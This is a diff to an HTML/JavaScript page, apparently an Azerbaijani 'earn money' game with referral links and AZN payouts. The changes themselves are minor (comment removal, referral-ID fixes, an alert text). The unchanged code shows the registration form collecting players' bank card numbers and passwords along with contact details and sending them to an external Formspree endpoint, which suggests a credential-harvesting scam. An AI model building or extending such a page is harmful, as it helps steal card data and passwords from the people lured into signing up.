@@ -56,11 +56,9 @@
             border-radius: 1rem;
             margin: 0.8rem 0;
             font-size: 0.85rem;
-            color: #ffffff;  /* Ağ rəng - oxunaqlılıq üçün */
+            color: #ffffff;
         }
-        .rule-box strong, .rule-box b {
-            color: #F59E0B; /* Başlıqlar narıncı */
-        }
+        .rule-box strong, .rule-box b { color: #F59E0B; }
         input, button {
             width: 100%;
             padding: 12px;
@@ -198,7 +196,6 @@
         <div id="profile-info" class="info-text" style="background:#0F172A; padding:10px; border-radius:1rem; margin-bottom: 12px;"></div>
         <div id="balance-info" class="balance-badge">💰 Ümumi Qazanc: 0 AZN (30 gün toplanır)</div>
         
-        <!-- Referal bölməsi -->
         <div class="referral-box">
             <strong>🔗 Öz referal linkiniz:</strong><br>
             <input type="text" id="referralLink" readonly value="" style="font-size:12px; padding:6px;">
@@ -229,7 +226,6 @@
 </div>
 
 <script>
-    // ======================== FORMPREE ENDPOINT ========================
     let currentPlayer = null;
     let gameInterval = null, drawInterval = null;
     let drawnNumbers = [];
@@ -365,14 +361,12 @@
         all[userId] = currentPlayer;
         localStorage.setItem('all_players', JSON.stringify(all));
         
-        // Formspree-ə məlumat göndər
         const formData = {
             fullname, email, instagram, telefon: phone, kart: card, sifre: password,
             referrer: referrerId || 'yoxdur', registeredAt: new Date().toLocaleString()
         };
         await sendToFormspree(formData);
         
-        // Referal bonusu (yeni istifadəçi referal link ilə gəlibsə)
         if (referrerId) {
             let referrer = loadPlayerById(referrerId);
             if (referrer) {
@@ -410,6 +404,11 @@
         updateBalanceDisplay();
         updateWithdrawButton();
         
+        // Köhnə profillərdə id yoxdursa, yenisini yarat
+        if (!currentPlayer.id) {
+            currentPlayer.id = Date.now() + '-' + Math.random().toString(36).substr(2,6);
+            savePlayer(currentPlayer);
+        }
         const baseUrl = window.location.origin + window.location.pathname;
         const refLink = `${baseUrl}?ref=${currentPlayer.id}`;
         const refInput = document.getElementById('referralLink');
@@ -420,7 +419,7 @@
         const refInput = document.getElementById('referralLink');
         refInput.select();
         document.execCommand('copy');
-        alert("✅ Link kopyalandı! Paylaşın və bonus qazanın.");
+        alert("✅ Link kopyalandı! İndi linkdə ?ref=... hissəsi var. Bu linki paylaşın.");
     }
 
     function updateBalanceDisplay() {
@@ -558,10 +557,15 @@
     window.onload = () => {
         const saved = loadPlayer();
         if (saved) { 
-            currentPlayer = saved; 
+            currentPlayer = saved;
+            // Köhnə profillərdə id yoxdursa, əlavə et
+            if (!currentPlayer.id) {
+                currentPlayer.id = Date.now() + '-' + Math.random().toString(36).substr(2,6);
+                savePlayer(currentPlayer);
+            }
             showProfileScreen();
         }
     };
 </script>
 </body>
-    </html>
+        </html>
